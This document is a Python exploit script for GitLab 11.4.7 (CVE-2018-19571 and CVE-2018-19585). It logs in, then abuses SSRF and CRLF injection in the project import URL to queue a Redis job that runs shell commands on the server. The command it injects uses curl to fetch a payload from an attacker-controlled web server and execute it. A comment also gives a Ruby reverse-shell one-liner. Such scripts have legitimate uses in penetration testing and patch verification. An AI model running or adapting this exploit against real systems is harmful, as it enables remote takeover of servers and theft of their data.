# Exploit Title: GitLab 11.4.7 RCE (3)
# Date: 17th Aug 2024
# Original Exploit Author: Norbert Hofmann
# Exploit Modified By: @bstraw Vinny Torino
# Original Author: Mohin Paramasivam
# Software Link: https://gitlab.com/
# Environment: GitLab 11.4.7, community edition
# CVE: CVE-2018-19571 + CVE-2018-19585
#
# Resources I used
# https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/
# https://gtfobins.github.io/gtfobins/ruby/
# https://github.com/ctrlsam/GitLab-11.4.7-RCE/blob/master/exploit.py

#!/usr/bin/env python3

import random
import requests
import string
import sys
import urllib.parse


# Please, change the fields bellow my guy ! s2
# '--------------------------------------------------------------------------------------------------------------------------------------'

# We need valid creds
username = 'root'
password = 'root'

# Target's IP, Port, and Schema
rhost = '10.10.10.100'
rport = 5080
schema = 'http'

# You must host your payload on a webserver
# Cool Ruby Rev Shell I used:
'''
export RHOST=10.10.10.11
export RPORT=53
ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
'''
http_server = '10.10.10.11'
http_port = 80
filename = 'lolz'

# We're gonna fetch and execute ur payload on the target!
# The curl will run a few times! Sorry, I don't know how to avoid it!
cmd = f'curl http://{http_server}:{str(http_port)}/{filename} -o /dev/shm/{filename}; sh /dev/shm/{filename}; rm /dev/shm/{filename}'

# Do not forget to remove the project manually later
repo = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

# '--------------------------------------------------------------------------------------------------------------------------------------'
#
# H4ck Th3n With K1ndn3ss !!
#
# '--------------------------------------------------------------------------------------------------------------------------------------'


def extract_cookie_and_csrf():
    try:
        res = requests.get(f'{schema}://{rhost}:{str(rport)}/users/sign_in',
        verify=False,
        allow_redirects=False
        )
    except:
        return None, None
    for line in res.text.split('<'):
        if 'csrf-token' in line:
            csrf_token = line.split('"')[3]
    cookie = res.headers['Set-Cookie'].split('=')[1].split(';')[0]
    return csrf_token, cookie


def login(csrf_token, cookie):
    auth = {
        'utf8': '✓',
        'authenticity_token': csrf_token,
        'user[login]': username,
        'user[password]': password,
        'user[remember_me]': 0
    }
    data = bytes(urllib.parse.urlencode(auth), 'utf-8')
    cookies = {
        '_gitlab_session': cookie,
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    res = requests.post(
        f'{schema}://{rhost}:{str(rport)}/users/sign_in', 
        headers=headers, 
        cookies=cookies, 
        data=data, 
        verify=False, 
        allow_redirects=False
    )
    if res.status_code != 302:
        return None
    return res.headers['Set-Cookie'].split('=')[1].split(';')[0]


def extract_namespace_id(session):
    pj_id = None
    cookies = {
        '_gitlab_session': session,
    }
    try:
        res = requests.get(f'{schema}://{rhost}:{str(rport)}/projects/new',
        cookies=cookies,
        verify=False,
        allow_redirects=False
        )
    except:
        return None
    for line in res.text.split('<'):
        if '[namespace_id]' in line:
            pj_id = int(line.split('"')[1])
            break
    return pj_id


def extract_project_csrf(session):
    cookies = {
        '_gitlab_session': session,
    }
    try:
        res = requests.get(f'{schema}://{rhost}:{str(rport)}/projects/new',
        cookies=cookies,
        verify=False,
        allow_redirects=False
        )
    except:
        return None
    for line in res.text.split('<'):
        if 'csrf-token' in line:
            csrf_token = line.split('"')[3]
    return csrf_token


def exploit(session, pj_token, pj_id):
    cookies = {
        '_gitlab_session': session,
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    malicious_import_url = """git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test
 multi

 sadd resque:gitlab:queues system_hook_push

 lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|""" + cmd + """ \\').read\\"],\\"retry\\":0,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1608799993.1234567,\\"enqueued_at\\":1608799993.1234567}"
 
 exec
 exec
 exec\n"""
    proj = {
        'utf8': '✓',
        'authenticity_token': pj_token,
        'project[import_url]': 'PLACEHOLDER',
        'project[ci_cd_only]': 'false',
        'project[name]': repo,
        'project[namespace_id]': pj_id,
        'project[path]': repo,
        'project[description]': repo,
        'project[visibility_level]': 0,
    }
    encoded = urllib.parse.urlencode(proj)
    data = encoded.replace('PLACEHOLDER', malicious_import_url)
    payload = bytes(data, 'utf-8')
    res = requests.post(
        f'{schema}://{rhost}:{str(rport)}/projects', 
        headers=headers, 
        cookies=cookies, 
        data=payload, 
        verify=False, 
        allow_redirects=False
    )
    if res.status_code != 302:
        return False
    return True


if __name__ == '__main__':
    # Extract login csrf token 
    csrf_token, cookie = extract_cookie_and_csrf()
    if csrf_token is None:
        print('Could not extract csrf token! aborting execution!')
        sys.exit(1)

    # Attempt to login in with the credentials provided 
    session = login(csrf_token, cookie)
    if session is None:
        print('Login Failed!')
        sys.exit(1)
    
    # Extract namespace id
    pj_id = extract_namespace_id(session)
    if pj_id is None:
        print('Could not extract namespace id! aborting!')
        sys.exit(1)

    # Extract project csrf token
    pj_token = extract_project_csrf(session)
    if pj_token is None:
        print('Looks like we cannot create projects! Aborting!')
        sys.exit(1)
    
    # Let's exploit it
    # We are basicaly using a SSRF + CRLF to talk to redis
    # Then we are using GitShellWorker to run our payload!
    works = exploit(session, pj_token, pj_id)
    if works == False:
        print('Something went wrong! Exploit did not work!')
        sys.exit(1)

    print('1337! Let\'s fetch and exec ur paylod!')
    print(f'Don\'t forget to remove the project we added! {repo}')
